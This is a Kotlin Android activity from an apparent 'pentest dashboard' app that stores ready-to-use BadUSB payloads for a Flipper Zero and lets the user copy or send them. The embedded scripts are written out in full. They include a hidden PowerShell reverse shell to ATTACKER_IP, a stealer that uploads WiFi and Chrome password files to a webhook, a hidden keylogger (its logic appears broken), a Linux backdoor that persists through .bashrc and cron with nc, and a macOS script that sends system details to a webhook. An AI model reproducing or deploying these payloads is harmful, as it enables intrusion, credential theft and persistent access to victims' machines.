package com.pentest.dashboard

import android.os.Bundle
import android.widget.ArrayAdapter
import android.widget.ImageView
import android.widget.ListView
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import com.google.android.material.button.MaterialButton

data class BadUSBPayload(val name: String, val description: String, val script: String)

class BadUSBActivity : AppCompatActivity() {

    private lateinit var payloadList: ListView
    private lateinit var payloadDetails: TextView
    private lateinit var btnExecute: MaterialButton
    private lateinit var btnCopyScript: MaterialButton

    private val payloads = mutableListOf<BadUSBPayload>()
    private var selectedPayload: BadUSBPayload? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_badusb)

        initializeViews()
        setupClickListeners()
        loadPayloads()
    }

    private fun initializeViews() {
        payloadList = findViewById(R.id.payloadList)
        payloadDetails = findViewById(R.id.payloadDetails)
        btnExecute = findViewById(R.id.btnExecute)
        btnCopyScript = findViewById(R.id.btnCopyScript)

        btnExecute.isEnabled = false
        btnCopyScript.isEnabled = false

        payloadList.setOnItemClickListener { _, _, position, _ ->
            selectedPayload = payloads[position]
            showPayloadDetails(payloads[position])
            btnExecute.isEnabled = true
            btnCopyScript.isEnabled = true
        }
    }

    private fun setupClickListeners() {
        findViewById<ImageView>(R.id.btnBack).setOnClickListener { finish() }

        btnExecute.setOnClickListener {
            selectedPayload?.let { executePayload(it) }
        }

        btnCopyScript.setOnClickListener {
            selectedPayload?.let { copyScript(it) }
        }
    }

    private fun loadPayloads() {
        payloads.clear()

        // Windows payloads
        payloads.add(BadUSBPayload(
            "Windows Reverse Shell",
            "Opens PowerShell reverse shell to attacker",
            """
REM Windows Reverse Shell
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING ${'$'}client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);
ENTER
STRING ${'$'}stream = ${'$'}client.GetStream();
ENTER
STRING [byte[]]${'$'}bytes = 0..65535|%{0};
ENTER
STRING while((${'$'}i = ${'$'}stream.Read(${'$'}bytes, 0, ${'$'}bytes.Length)) -ne 0){
ENTER
STRING ${'$'}data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(${'$'}bytes,0, ${'$'}i);
ENTER
STRING ${'$'}sendback = (iex ${'$'}data 2>&1 | Out-String );
ENTER
STRING ${'$'}sendback2 = ${'$'}sendback + 'PS ' + (pwd).Path + '> ';
ENTER
STRING ${'$'}sendbyte = ([text.encoding]::ASCII).GetBytes(${'$'}sendback2);
ENTER
STRING ${'$'}stream.Write(${'$'}sendbyte,0,${'$'}sendbyte.Length);
ENTER
STRING ${'$'}stream.Flush()}
ENTER
STRING ${'$'}client.Close()
ENTER
            """.trimIndent()
        ))

        payloads.add(BadUSBPayload(
            "Windows Password Stealer",
            "Extracts WiFi passwords and Chrome saved passwords",
            """
REM Extract WiFi and Chrome Passwords
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING ${'$'}wifi = (netsh wlan show profiles) | Select-String '\\:(.+)${'$'}' | %{${'$'}name=${'$'}_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=${'$'}name key=clear)} | Select-String 'Key Content\\W+\\:(.+)${'$'}' | %{${'$'}pass=${'$'}_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=${'$'}name;PASSWORD=${'$'}pass }} | Format-Table -AutoSize | Out-File ${'$'}env:TEMP\\wifi.txt
ENTER
STRING copy "${'$'}env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data" "${'$'}env:TEMP\\chrome.db"
ENTER
STRING curl.exe -F "file=@${'$'}env:TEMP\\wifi.txt" WEBHOOK_URL
ENTER
STRING curl.exe -F "file=@${'$'}env:TEMP\\chrome.db" WEBHOOK_URL
ENTER
STRING exit
ENTER
            """.trimIndent()
        ))

        payloads.add(BadUSBPayload(
            "Windows Keylogger",
            "Installs hidden PowerShell keylogger",
            """
REM PowerShell Keylogger
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING Add-Type -AssemblyName System.Windows.Forms
ENTER
STRING ${'$'}log = '${'$'}env:TEMP\\keys.txt'
ENTER
STRING while(${'$'}true){
ENTER
STRING foreach(${'$'}key in [Enum]::GetValues([System.Windows.Forms.Keys])){
ENTER
STRING if([System.Windows.Forms.Control]::IsKeyLocked(${'$'}key)){
ENTER
STRING Add-Content ${'$'}log ${'$'}key
ENTER
STRING }
ENTER
STRING }
ENTER
STRING Start-Sleep -Milliseconds 100
ENTER
STRING }
ENTER
            """.trimIndent()
        ))

        payloads.add(BadUSBPayload(
            "Linux Backdoor",
            "Creates persistent SSH backdoor on Linux",
            """
REM Linux Backdoor
DELAY 1000
CTRL ALT t
DELAY 500
STRING echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> ~/.bashrc
ENTER
STRING (crontab -l 2>/dev/null; echo "@reboot nc ATTACKER_IP 4444 -e /bin/bash") | crontab -
ENTER
STRING exit
ENTER
            """.trimIndent()
        ))

        payloads.add(BadUSBPayload(
            "macOS Exfiltration",
            "Extracts system info and sends to webhook",
            """
REM macOS Data Exfiltration
DELAY 1000
GUI SPACE
DELAY 500
STRING terminal
DELAY 500
ENTER
DELAY 1000
STRING curl -X POST -F "hostname=${'$'}(hostname)" -F "user=${'$'}(whoami)" -F "ip=${'$'}(ifconfig | grep inet)" -F "wifi=${'$'}(networksetup -listpreferredwirelessnetworks en0)" WEBHOOK_URL
ENTER
STRING exit
ENTER
            """.trimIndent()
        ))

        updateList()
    }

    private fun updateList() {
        val adapter = ArrayAdapter(
            this,
            android.R.layout.simple_list_item_1,
            payloads.map { it.name }
        )
        payloadList.adapter = adapter
    }

    private fun showPayloadDetails(payload: BadUSBPayload) {
        payloadDetails.text = """
NAME: ${payload.name}

DESCRIPTION:
${payload.description}

SCRIPT:
${payload.script}

NOTES:
- Replace ATTACKER_IP with your listening server
- Replace WEBHOOK_URL with your data collection endpoint
- Test on your own devices only
- Requires Flipper Zero or compatible BadUSB device
        """.trimIndent()
    }

    private fun executePayload(payload: BadUSBPayload) {
        addLog("=== EXECUTING PAYLOAD ===")
        addLog("Payload: ${payload.name}")
        addLog("")
        addLog("Sending to Flipper Zero...")
        addLog("")
        addLog("This requires:")
        addLog("- Flipper Zero connected via USB")
        addLog("- BadUSB app running on Flipper")
        addLog("- Target device connected")
        addLog("")
        addLog("Script:")
        addLog(payload.script)
    }

    private fun copyScript(payload: BadUSBPayload) {
        val clipboard = getSystemService(CLIPBOARD_SERVICE) as android.content.ClipboardManager
        val clip = android.content.ClipData.newPlainText("BadUSB Script", payload.script)
        clipboard.setPrimaryClip(clip)
        addLog("Script copied to clipboard!")
        addLog("Save to Flipper: /badusb/${payload.name.replace(" ", "_")}.txt")
    }

    private fun addLog(message: String) {
        val timestamp = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US)
            .format(java.util.Date())
        val current = payloadDetails.text.toString()
        payloadDetails.text = "[$timestamp] $message\n$current"
    }
}
